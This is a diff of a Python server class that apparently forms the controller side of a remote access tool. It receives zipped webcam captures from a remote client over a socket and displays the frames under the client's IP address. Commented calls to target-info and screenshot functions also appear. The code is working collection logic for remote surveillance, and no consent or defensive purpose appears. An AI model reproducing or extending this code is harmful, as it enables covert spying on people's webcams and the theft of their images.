@@ -43,7 +43,8 @@ class Server:
                 print(str(sys.getsizeof(full)) + " " + str(size))
             print("Waiting: ")
             recvfile = (self.client_socket.recv(buff))
-            print(str(recvfile.decode()) + " HERE  ")
+            print("received")
+            #print(str(recvfile.decode()) + " HERE  ")
             full += recvfile
 
         return full
@@ -93,11 +94,12 @@ class Server:
 
     def progress(self):
         print("This was 100% successful")
-        input()
+        input("Start")
         while True:
             #self.getTargetInfo()
             #self.screenshot()
-            self.rec200vid()
+            #self.rec200vid()
+            self.webcamsend()
             input("Play? ")
             self.test2()
             input("Complete")
@@ -179,37 +181,39 @@ class Server:
 
     def test2(self):
 
-        with ZipFile(f'../receivedfile/webcam{str(self.recvcounter)}.zip', 'r') as zip_ref:
-            zip_ref.extractall(f'../receivedfile/webcam{str(self.recvcounter)}',)
-        path = f'../receivedfile/webcam{str(self.recvcounter)}'
+        #path = f'../receivedfile/webcam{str(self.recvcounter - 1)}'
+        path = f'../receivedfile/webcamS'
+        path2 = f'../receivedfile/webcamS/logs/Video'
+        print(str(path))
+        with ZipFile(path + ".zip", 'r') as zip_ref:
+            zip_ref.extractall(path)
 
-        cv2.namedWindow("P2")
-        with os.scandir(path) as entries:
+        cv2.namedWindow(f"{self.address[0]}'s Webcam")
+        with os.scandir(path2) as entries:
             for entry in entries:
                 print(entry.name)
-                p = str(path) + str("/") + str(entry.name)
+                p = str(path2) + str("/") + str(entry.name)
                 x = cv2.imread(p)
-                cv2.imshow("P2", x)
+                cv2.imshow(f"{self.address[0]}'s Webcam", x)
                 cv2.waitKey(0)
+        cv2.destroyWindow(f"{self.address[0]}'s Webcam")
 
-    def rec200vid(self):
-        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
-        time.sleep(0.1)
-        print("response was : " + response)
-        if response == "Success":
-            print("success")
-            #time.sleep(15)
+    def webcamsend(self):
+        #command = "-Fsend"
+        #self.client_socket.send(command.encode("utf-8"))
+
+        response = self.client_socket.recv(self.BUFFER_SIZE)
+        if response.decode("utf-8") == "Success":
             size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
-            print("size:" + str(size))
-            # size = self.client_socket.recv(self.BUFFER_SIZE).decode()
-            # print("size:" + str(size))
             time.sleep(0.1)
+            print("Size  = " + size)
             if int(size) <= self.BUFFER_SIZE:
                 # recv archive
                 archive = self.client_socket.recv(self.BUFFER_SIZE)
-                print("*** Got file ***")
+                print("*** Got small file ***")
 
-                with open(f'../receivedfile/webcam{str(self.recvcounter)}.zip', 'wb+') as output:
+                with open(f'../receivedfile/webcamS.zip', 'wb+') as output:
+                    print("Opened file s ")
                     output.write(archive)
 
                 print("*** File saved ***")
@@ -221,14 +225,16 @@ class Server:
                 # recv archive
                 fullarchive = self.saveBigFile(int(size), buff)
 
-                print("*** Got file *** ")
-                with open(f'../receivedfile/webcam{str(self.recvcounter)}.zip', 'wb+') as output:
+                print("*** Got large file *** ")
+                with open(f'../receivedfile/webcamS.zip', 'wb+') as output:
+                    print("Opened file L ")
                     output.write(fullarchive)
 
                 print("*** File saved ***")
                 self.recvcounter += 1
         else:
             print(response.decode("utf-8"))
+
 
 def main():
     """ Creating the necessary dirs """
